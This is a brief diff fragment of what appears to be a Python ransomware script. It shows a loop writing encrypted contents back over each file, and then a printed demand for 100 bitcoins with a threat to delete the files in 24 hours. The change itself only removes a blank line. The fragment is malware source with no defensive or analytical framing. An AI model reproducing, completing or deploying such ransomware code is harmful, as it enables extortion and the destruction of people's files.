@@ -35,5 +35,4 @@ for file in files:
 		thefile.write(contents_encrypted)
 #writing encrypted data back into the file
 
-
 print("All of your files have been encrypted!!! Send me 100 bitcoins or i'll delete them in 24 hours ")
